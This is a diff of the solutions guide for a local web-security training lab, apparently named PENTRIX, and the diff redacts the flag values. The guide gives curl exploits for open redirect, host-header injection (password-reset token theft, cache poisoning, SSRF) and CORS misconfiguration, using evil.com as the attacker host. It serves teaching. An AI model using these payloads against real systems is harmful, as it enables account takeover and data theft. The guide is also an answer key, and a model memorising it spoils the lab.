@@ -6,7 +6,7 @@ exploit genuinely succeeds, never on a plain page view.
 
 ## redirect - Open Redirect
 
-**1. Protocol-Relative Redirect** - `PENTRIX{redirect_redirect-double-slash}`
+**1. Protocol-Relative Redirect** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/go?next=//evil.com"
@@ -18,7 +18,7 @@ Why it works: the `next` parameter is passed to the redirect with zero
 validation, and a URL starting with `//` keeps the current scheme but navigates
 to the attacker's host.
 
-**2. javascript: Scheme Honored** - `PENTRIX{redirect_redirect-javascript}`
+**2. javascript: Scheme Honored** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
@@ -29,7 +29,7 @@ curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
 Why it works: the endpoint sets the `Location` header from user input with no
 scheme allowlist, so a `javascript:` URL is honored verbatim.
 
-**3. data: Scheme Honored** - `PENTRIX{redirect_redirect-data}`
+**3. data: Scheme Honored** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
@@ -40,7 +40,7 @@ curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Eale
 Why it works: same missing scheme check as lab 2; a `data:text/html` URL
 smuggles a whole attacker-controlled document through the redirect.
 
-**4. Backslash Allowlist Bypass** - `PENTRIX{redirect_redirect-backslash}`
+**4. Backslash Allowlist Bypass** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/trusted?next=https:%5C%5Cevil.com"
@@ -55,7 +55,7 @@ Why it works: the naive allowlist compares the raw string prefix instead of the
 parsed hostname and accepts backslash as a separator, while browsers and the
 URL parser normalize `\` to `/`, so the real destination is evil.com.
 
-**5. OAuth Code Theft via redirect_uri** - `PENTRIX{redirect_redirect-oauth-theft}`
+**5. OAuth Code Theft via redirect_uri** - `PENTRIX{...}`
 
 Full chain (the victim is simulated with a cookie jar):
 
@@ -81,7 +81,7 @@ Why it works: `redirect_uri` is never validated against the client's registered
 URLs, so the authorization code is delivered to the attacker's collector, where
 it can be exchanged for an access token.
 
-**6. Parameter Pollution Picks Last** - `PENTRIX{redirect_redirect-pollution}`
+**6. Parameter Pollution Picks Last** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/polluted?next=safe&next=https://evil.com"
@@ -94,7 +94,7 @@ last value; the first one is only camouflage for anyone reviewing the link.
 
 ## hostheader - Host Header Injection
 
-**1. Password Reset Poisoning** - `PENTRIX{hostheader_host-reset-poison}`
+**1. Password Reset Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -108,7 +108,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: the reset link is built from the untrusted `Host` header, so the
 victim's valid token is delivered to the attacker's domain.
 
-**2. Cache Poisoning via Host** - `PENTRIX{hostheader_host-cache-poison}`
+**2. Cache Poisoning via Host** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -123,7 +123,7 @@ curl -s "$B/hostheader/app/clear" -o /dev/null
 Why it works: the portal page is cached by path alone, so the copy rendered
 under the attacker's `Host` is served to every later visitor.
 
-**3. SSRF via Host Header** - `PENTRIX{hostheader_host-ssrf}`
+**3. SSRF via Host Header** - `PENTRIX{...}`
 
 ```bash
 curl -s -H "Host: 127.0.0.1:13919" http://127.0.0.1:3109/hostheader/status \
@@ -135,7 +135,7 @@ Why it works: the server-side health check builds its fetch URL from the `Host`
 header, so pointing it at `127.0.0.1:13919` makes the server fetch the
 loopback-only internal monitoring agent and return its secrets.
 
-**4. X-Forwarded-Host Poisoning** - `PENTRIX{hostheader_host-xforwarded}`
+**4. X-Forwarded-Host Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -147,7 +147,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: behind a proxy this reset page trusts `X-Forwarded-Host` over
 `Host`; same poisoning, different header.
 
-**5. X-Host-Override Poisoning** - `PENTRIX{hostheader_host-override}`
+**5. X-Host-Override Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -159,7 +159,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: a vendor-specific variant of the same flaw; `X-Host-Override`
 wins over `Host` when building the reset link.
 
-**6. Absolute Continue URL** - `PENTRIX{hostheader_host-abs-url}`
+**6. Absolute Continue URL** - `PENTRIX{...}`
 
 ```bash
 curl -i -H "Host: evil.com" --data "username=alice&password=alice123" \
@@ -180,7 +180,7 @@ Each lab is proven through `/cors/prove?vuln=<id>&origin=<Origin>`: the server
 makes a real request to the vulnerable endpoint with that `Origin` and awards
 the flag only when the vulnerable header combination is genuinely demonstrated.
 
-**1. Reflected Origin with Credentials** - `PENTRIX{cors_cors-reflect}`
+**1. Reflected Origin with Credentials** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2Fevil.com" \
@@ -193,7 +193,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2
 Why it works: the endpoint reflects any `Origin` with credentials allowed and
 no allowlist at all, so any website can read authenticated responses.
 
-**2. Null Origin Trusted** - `PENTRIX{cors_cors-null}`
+**2. Null Origin Trusted** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
@@ -205,7 +205,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
 Why it works: `Origin: null` (sandboxed iframes, file:// pages) is trusted with
 credentials, handing the data to attacker-controlled null-origin contexts.
 
-**3. Regex Allowlist Bypass** - `PENTRIX{cors_cors-regex}`
+**3. Regex Allowlist Bypass** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-regex&origin=https%3A%2F%2Fpentrix.lab.evil.com" \
@@ -218,7 +218,7 @@ being under pentrix.lab. (Note: the commonly written anchored form
 `^https://.*\.pentrix\.lab$` would NOT match this payload - the missing dot
 before `pentrix` and the missing `$` are exactly the naive mistakes.)
 
-**4. Wildcard on Sensitive Data** - `PENTRIX{cors_cors-wildcard-data}`
+**4. Wildcard on Sensitive Data** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3A%2F%2Fevil.com" \
@@ -230,7 +230,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3
 Why it works: a wildcard origin on an endpoint returning sensitive user data
 means literally any website can read it.
 
-**5. Subdomain Suffix Check** - `PENTRIX{cors_cors-subdomain}`
+**5. Subdomain Suffix Check** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-subdomain&origin=https%3A%2F%2Fevil.trusted.pentrix.lab" \
@@ -241,7 +241,7 @@ Why it works: the check is only `hostname.endsWith('.trusted.pentrix.lab')`
 with no allowlist of real subdomains, so an attacker-controlled subdomain
 passes.
 
-**6. Exposed Admin Token Header** - `PENTRIX{cors_cors-expose-headers}`
+**6. Exposed Admin Token Header** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-expose-headers&origin=https%3A%2F%2Fevil.com" \
